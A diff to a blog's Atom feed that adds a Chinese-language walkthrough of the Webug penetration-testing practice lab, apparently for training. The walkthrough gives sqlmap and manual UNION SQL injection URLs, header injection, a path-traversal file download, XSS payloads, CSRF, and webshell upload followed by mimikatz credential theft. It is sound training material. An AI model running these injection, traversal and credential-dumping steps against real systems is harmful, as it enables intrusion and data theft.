@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://zer0yu.github.io/"/>
-  <updated>2017-10-24T08:05:10.532Z</updated>
+  <updated>2017-10-24T08:18:56.321Z</updated>
   <id>http://zer0yu.github.io/</id>
   
   <author>
@@ -14,6 +14,161 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Webug渗透基础教程</title>
+    <link href="http://zer0yu.github.io/2017/10/24/Webug%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/"/>
+    <id>http://zer0yu.github.io/2017/10/24/Webug渗透基础教程/</id>
+    <published>2017-10-24T08:14:18.000Z</published>
+    <updated>2017-10-24T08:18:56.321Z</updated>
+    
+    <content type="html"><![CDATA[<p>####普通的GET注入</p>
+<p>解法一：使用sqlmap</p>
+<p>1）sqlmap -u”<a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1" target="_blank" rel="external">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1</a>“ -b –current-db –current-user</p>
+<p>可以看到当前的数据库名称以及用户名称</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-1.png" alt="webug1-1"></p>
+<p>2）sqlmap -u”<a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1" target="_blank" rel="external">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1</a>“ -D pentesterlab –tables</p>
+<p>可以看到pentesterlab中有那些数据表</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-2.png" alt="img"></p>
+<p>3）sqlmap -u”<a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1" target="_blank" rel="external">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1</a>“ -D pentesterlab -T flag –columns</p>
+<p>显示出该表下的所有列</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-3.png" alt="img"></p>
+<p>4）sqlmap -u”<a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1" target="_blank" rel="external">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1</a>“ -D pentesterlab -T flag -C flag –dump</p>
+<p>得到flag:204f704fbbcf6acf398ffee11989b377</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-4.png" alt="img"></p>
+<p>解法二：手工进行注入</p>
+<p>1）先通过order by 子句判断有几个字段。</p>
+<p><a href="http://172.16.193.128" target="_blank" rel="external">http://172.16.193.128</a>/pentest/test/sqli/sqltamp.php?gid=1’ order by 1 –+</p>
+<p>当order by 后加数字为5的时候报错因而判断有4个表</p>
+<p>2）爆数据库</p>
+<p><a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1" target="_blank" rel="external">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1</a>‘ UNION SELECT 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database() –+</p>
+<p>3）爆表名</p>
+<p><a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1" target="_blank" rel="external">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1</a>‘ UNION SELECT 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666c6167 –+</p>
+<p>4）爆列名</p>
+<p><a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1" target="_blank" rel="external">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1</a>‘ UNION SELECT 1,2,3,group_concat(id,0x5e,flag) from flag –+</p>
+<p>参考：</p>
+<p><a href="http://www.freebuf.com/articles/web/29942.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/29942.html</a></p>
+<p><a href="http://www.cnblogs.com/zlgxzswjy/p/6707433.html" target="_blank" rel="external">http://www.cnblogs.com/zlgxzswjy/p/6707433.html</a></p>
+<p>####从图片中你能找到什么？</p>
+<p>1）首先从网站下载这个图片，之后你可以选择用winhex（windows平台使用）分析或者使用binwalk（linux平台）来分析，这里使用binwalk</p>
+<p>2）先看看文件的构成，可以看到是有一个rar格式的文件在里面的</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-5.png" alt="img"></p>
+<p>3）分离文件（当然你把文件后缀修改为rar也是可以的）</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-6.png" alt="img"></p>
+<p>4）直接看123.txt的内容是：密码是123。之后post这个密码就好</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-7.png" alt="img"></p>
+<p>他题没有出好，咱们的思路是没有问题的。</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-8.png" alt="img"></p>
+<p>####你看到了什么？</p>
+<p>1）题目不明确的时候就看源码，源码注释部分有扫目录的提示</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-9.png" alt="img"></p>
+<p>2）使用工具扫描目录</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-10.png" alt="img"></p>
+<p>其实这里存在一个小技巧，如果对方没有设置好apache的话会出现列目录的情况，这往往会泄露信息</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-11.png" alt="img"></p>
+<p>3）看一眼诡异的test</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-12.png" alt="img"></p>
+<p>4）然后就解答了</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-13.png" alt="img"></p>
+<p>####告诉你了FLANG是5位数</p>
+<p>1）分析：先看源码无提示；再考虑注册等功能发现无解；最后考虑爆破</p>
+<p>2）爆破无验证码所以使用burpsuite（此处示例使用）或者AWVS等工具均可，若有验证码则要考虑自己编写脚本。最后可以发现爆破结果为admin：admin123</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-14.png" alt="img"></p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-15.png" alt="img"></p>
+<p>3）登录发现没有flag（其实也是题目的问题，我们阅读源码即可发现）</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-16.png" alt="img"></p>
+<p>####一个优点小小的特殊的注入</p>
+<p>1）提示头注入，所以直接使用sqlmap进行注入，首先burp抓包然后保存在sqlmap中</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-17.png" alt="img"></p>
+<p>2）分析：头注入可能出现的几个位置：X-Forwarded-For、User-agent、Referer、Cookie。此处没有出现X-Forwarded-For所以我将其加上先进行这个点的测试。运气不错直接报错。接下来进行注入，与第一题的手工注入过程类似进行注入即可，或者使用sqlmap进行注入（注入命令为：python .\sqlmap.py -r .\test.txt -p “X-Forwarded-For”   text.txt文件的内容为你抓的包）。</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-18.png" alt="img"></p>
+<p>最后成功注入得到flag</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-19.png" alt="img"></p>
+<p>注释：其实你手里是有源代码的，源码看下从白盒角度分析你就可以得到tips在哪儿。这里是基础代码审计不过多解释(代码审计可以借助一些工具的比如我最喜欢的cobra)。</p>
+<p>一下是使用cobra检测的结果：</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-22%20%E4%B8%8B%E5%8D%888.44.47.png" alt="img"></p>
+<p>####这关需要RMB购买哦</p>
+<p>1）点开可以看到只有一个登陆框，查看源代码看是否有tips,</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/12017-10-22%20%E4%B8%8B%E5%8D%888.51.55.png" alt="屏幕快照 2017-10-22 下午8.51.55"></p>
+<p>果真是有提示的：</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/22017-10-22%20%E4%B8%8B%E5%8D%889.02.58.png" alt="屏幕快照 2017-10-22 下午9.02.58"></p>
+<p>2）跟着提示走，猜测是否可能为注入，但是当我访问链接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://172.16.188.129/pentest/test/2/index.php?url=123</div></pre></td></tr></table></figure>
+<p>却出现了弹出并显示成功跳转，没啥用，还是看下账号密码吧，第一题注入也可以看到这个账号密码。</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/32017-10-22%20%E4%B8%8B%E5%8D%889.05.03.png" alt="屏幕快照 2017-10-22 下午9.05.03"></p>
+<p>3）账号：密码&gt;&gt;&gt;tom:123456登陆抓包可以控制金额进行买卖</p>
+<p>####越权</p>
+<p>1）让修改密码所以目标就很明确了，我要越权修改别人的密码</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/42017-10-22%20%E4%B8%8B%E5%8D%8810.11.33.png" alt="屏幕快照 2017-10-22 下午10.11.33"></p>
+<p>8.csrf</p>
+<p>题目已经提示了是csrf所以我门使用burpsuite抓包然后直接生成PoC即可。</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/52017-10-24%20%E4%B8%8A%E5%8D%8810.39.23.png" alt="屏幕快照 2017-10-24 上午10.39.23"></p>
+<p>我们可以来测试一下效果：</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/62017-10-24%20%E4%B8%8A%E5%8D%8810.42.42.png" alt="屏幕快照 2017-10-24 上午10.42.42"></p>
+<p>首先我们访问我们的PoC</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/72017-10-24%20%E4%B8%8A%E5%8D%8810.42.57.png" alt="屏幕快照 2017-10-24 上午10.42.57"></p>
+<p>之后点击submit便可以看到提示修改密码成功：</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/82017-10-24%20%E4%B8%8A%E5%8D%8810.43.04.png" alt="屏幕快照 2017-10-24 上午10.43.04"></p>
+<p>####URL跳转</p>
+<p>看到题目的提示我突然想到前面在源码中看到的一个提示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a href=&quot;index.php?url=#&quot;&gt;I&lt;/a&gt;</div></pre></td></tr></table></figure>
+<p>从这里顿时想到了跳转的原理，所以我们只需要这样做就可以访问百度了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">172.16.188.129/pentest/test/5/index.php?url=https://www.baidu.com/</div></pre></td></tr></table></figure>
+<p>####文件下载</p>
+<p>直接访问发现是404，感觉有问题，还以为是要扫描发现某些文件，但发现不是，便去服务器看了下题目源码：</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/92017-10-24%20%E4%B8%8A%E5%8D%8810.54.40.png" alt="屏幕快照 2017-10-24 上午10.54.40"></p>
+<p>可以看到这个index.php是有问题的，所以我们直接看download.php即可</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/102017-10-24%20%E4%B8%8A%E5%8D%8810.59.28.png" alt="屏幕快照 2017-10-24 上午10.59.28"></p>
+<p>觉得没有方向的话还是先看源码或者抓包看有没有提示，很巧在源码中我们可以看到有个tips：帮管理员找回mysql帐号密码。通过文件下载找管理员密码，那么可以判断此处应该是任意文件下载漏洞。而要找到管理员的密码我们肯定是要先下载数据库配置文件之后看情况来判断是否需要下载数据库文件。通过之前那个题我们知道这个靶场的apache没有配置好导致文件路径泄漏的问题。所以我们来手动翻一翻。</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/112017-10-24%20%E4%B8%8A%E5%8D%8811.08.29.png" alt="屏幕快照 2017-10-24 上午11.08.29"></p>
+<p>发现data这个路径下什么都没有，所以是不是可能存在一个跟data同级的目录（其实刚才看源码我都看到了）</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/122017-10-24%20%E4%B8%8A%E5%8D%8811.10.34.png" alt="屏幕快照 2017-10-24 上午11.10.34"></p>
+<p>成功发现config.php，之后我们构造PoC进行下载：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://172.16.188.129/pentest//test/6/1/download.php?fname=../../../pentest/test/6/1/db/config.php</div></pre></td></tr></table></figure>
+<p>之后打开就可以找到密码了，并不需要进一步对数据库做什么。</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/132017-10-24%20%E4%B8%8A%E5%8D%8811.13.29.png" alt="屏幕快照 2017-10-24 上午11.13.29"></p>
+<p>####我和上题有点像</p>
+<p>这个和上面几乎一样，只不过参数的提交方式变了而已，我们用burp抓包然后修改pic参数即可。</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/12017-10-24%20%E4%B8%8A%E5%8D%8811.54.08.png" alt="屏幕快照 2017-10-24 上午11.54.08"></p>
+<p>####我系统密码忘记了</p>
+<p>1）使用账号密码：tom；123456进行登录，登录后发现可以上传文件，所以便尝试上传webshell</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/22017-10-24%20%E4%B8%8B%E5%8D%8812.00.24.png" alt="屏幕快照 2017-10-24 下午12.00.24"></p>
+<p>2）发现没有任何过滤，所以之后使用cknife进行连接</p>
+<p>3）上传mimikatz抓取管理员密码即可</p>
+<p>####xss</p>
+<p>无任何过滤的一个反射型xss</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://172.16.188.129/pentest/test/9/?id=%3Cscript%3Ealert(%27npusec%27)%3C/script%3E</div></pre></td></tr></table></figure>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/32017-10-24%20%E4%B8%8B%E5%8D%8812.12.35.png" alt="屏幕快照 2017-10-24 下午12.12.35"></p>
+<p>####存储型xss</p>
+<p>也是不存在任何的过滤，只需要在留言处填写：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(/npusec/)&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/42017-10-24%20%E4%B8%8B%E5%8D%8812.16.02.png" alt="屏幕快照 2017-10-24 下午12.16.02"></p>
+<p>####什么？图片上传不了？</p>
+<p>1）上传一张图片</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/62017-10-24%20%E4%B8%8B%E5%8D%883.05.40.png" alt="屏幕快照 2017-10-24 下午3.05.40"></p>
+<p>2）上传php脚本</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/72017-10-24%20%E4%B8%8B%E5%8D%883.05.56.png" alt="屏幕快照 2017-10-24 下午3.05.56"></p>
+<p>3）不能是图片还不能是脚本，我们看下处理的逻辑：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(strstr($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>],<span class="string">"image"</span>)&amp;&amp;strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"php"</span>))&#123;</div><div class="line"> </div><div class="line"> <span class="keyword">if</span> (file_exists(<span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))</div><div class="line">    &#123;</div><div class="line">    <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" already exists. "</span>;</div><div class="line">    &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">    move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],</div><div class="line">    <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Stored in: "</span> . <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"png"</span>)||strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"jpg"</span>)||strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"jpeg"</span>)||strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"bmp"</span>)||strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"gif"</span>))&#123;</div><div class="line"> <span class="keyword">echo</span> <span class="string">"&lt;font color='red'&gt;你真的上传了图片,可是这张图片我不喜欢,能换张吗?&lt;/font&gt;"</span>;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"> <span class="keyword">echo</span> <span class="string">"&lt;font color='blue'&gt;你居然不上传图片,宝宝怒了!!&lt;/font&gt;"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr/&gt;"</span>;</div></pre></td></tr></table></figure>
+<p>4）根据代码来判断文件的type要为image、其次文件name要有php：</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/82017-10-24%20%E4%B8%8B%E5%8D%883.14.16.png" alt="屏幕快照 2017-10-24 下午3.14.16"></p>
+<p>####明天双十一</p>
+<p>源码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(strstr($url,<span class="string">"www.taobao.com"</span>))&#123;</div><div class="line">		<span class="keyword">if</span>($_SERVER[<span class="string">'HTTP_HOST'</span>]==<span class="string">"10.10.10.10"</span>)&#123;</div><div class="line">		<span class="keyword">if</span>(strstr($_SERVER[<span class="string">'HTTP_REFERER'</span>],<span class="string">"www.baidu.com"</span>))&#123;</div><div class="line">		<span class="keyword">if</span>(strstr($_SERVER[<span class="string">'HTTP_REFERER'</span>],<span class="string">"www.baidu.com"</span>))&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"剁手了，请记录截图!!!flag:83242lkjKJ(*&amp;*^*&amp;k0"</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"不想剁手了"</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	&#125;</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"nono"</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	&#125;</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"哎呀，这里只允许10.10.10.10访问！！！"</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	&#125;</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"这个地方剁手不好，换个地方！"</span>;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
+<p>一目了然，只需要将几个关键地方设置正确即可：</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/52017-10-24%20%E4%B8%8B%E5%8D%883.01.40.png" alt="屏幕快照 2017-10-24 下午3.01.40"></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;####普通的GET注入&lt;/p&gt;
+&lt;p&gt;解法一：使用sqlmap&lt;/p&gt;
+&lt;p&gt;1）sqlmap -u”&lt;a href=&quot;http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1&quot; target=&quot;_blank&quot; r
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>南京邮电CTF题解</title>
